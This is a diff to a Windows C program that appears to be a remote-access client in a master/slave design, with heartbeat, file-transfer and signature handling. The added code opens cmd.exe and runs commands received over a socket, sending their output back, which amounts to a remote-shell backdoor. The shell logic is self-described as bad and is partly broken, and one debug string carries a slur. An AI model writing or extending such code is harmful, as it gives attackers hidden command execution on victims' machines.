@@ -23,8 +23,24 @@ const char _SIG_COUT[] = {0xfb, 0x02};
 const char _SIG_SHLL[] = {0xfb, 0x03};
 const char _SIG_HRBT[] = {0xff, 0xff};
 
+void DBGLG(char buf[], ...){
+    #ifdef DEBUG
+    va_list args;
+    int num = 0;
+    for(int i = 0; buf[i] != '\0'; ++i){
+        num += buf[i] == ':';
+    }
+    va_start(args, buf);
+    if (!num) printf("%s",buf);
+    else printf("%s%d\n",buf, va_arg(args, int));
+
+    va_end(args);
+    #endif
+}
+
 int MatchSig(char buf[2])
 {
+    printf("sig: %x %x\n", buf[0], buf[1]);
     if (buf[0] == (char)0xfb || buf[0] == (char)0xff){
         return buf[1];
     }
@@ -181,20 +197,7 @@ int TransferFile(char* path, SOCKET ConnectSocket)
     return 0;
 }
 
-void DBGLG(char buf[], ...){
-    #ifdef DEBUG
-    va_list args;
-    int num = 0;
-    for(int i = 0; buf[i] != '\0'; ++i){
-        num += buf[i] == ':';
-    }
-    va_start(args, buf);
-    if (!num) printf("%s",buf);
-    else printf("%s%d\n",buf, va_arg(args, int));
 
-    va_end(args);
-    #endif
-}
 
 int HeartBeat(SOCKET s){
     /* Slave -> Master relationship*/
@@ -202,6 +205,32 @@ int HeartBeat(SOCKET s){
     iResult = send(s, _SIG_HRBT, 2, 0);
     DBGLG("Sent heartbeat\n");
     return iResult;
+}
+
+int ShellInteract(FILE* shell, SOCKET sock){
+    /*BAD LOGIC*/
+    int iResult = 0;
+    char output[1024] = {0}; // Enough is enough))
+    char command[512] = {0};
+    iResult = recv(sock, (char*)&command, 512, 0);
+    printf("%.*s\n", iResult, command);
+    if (iResult < 0){
+        perror("recv in shell failed");
+        return -1;
+    }
+    if (strcmp(command, "exit\n") == 0) {
+        return 1;
+    }
+    fprintf(shell, "%s", command);
+    fflush(shell);
+    fgets(output, sizeof(output), shell);
+    iResult = send(sock, output, strlen(output), 0);
+    if(iResult < 0){
+        perror("send in shell failed");
+        return -1;
+    }
+
+    return 0;
 }
 
 int __cdecl main(int argc, char **argv)
@@ -287,7 +316,16 @@ int __cdecl main(int argc, char **argv)
             /* File transfer, presumably uploading to client */
                 break;
             case 0x2:
-                DBGLG("Got 2\n");
+                DBGLG("Got 2 starting shell\n");
+                FILE* shell = _popen("C:\\Windows\\System32\\cmd.exe", "w");
+                if (!shell) {
+                    perror("popen failed");
+                    return 1;
+                }
+                while ((iResult = ShellInteract(shell, sock)) == 0){
+                    NOP_FUNCTION;
+                }
+                _pclose(shell);
             /* Individual command output master -> (cmd) ->slave -> (output) -> master*/
                 break;
             case 0x3:
@@ -298,6 +336,8 @@ int __cdecl main(int argc, char **argv)
                 DBGLG("Got ff\n");
             /* Heartbeat */
                 break;
+            default:
+                DBGLG("Got retarded data\n");
         }
         closesocket(sock);
 
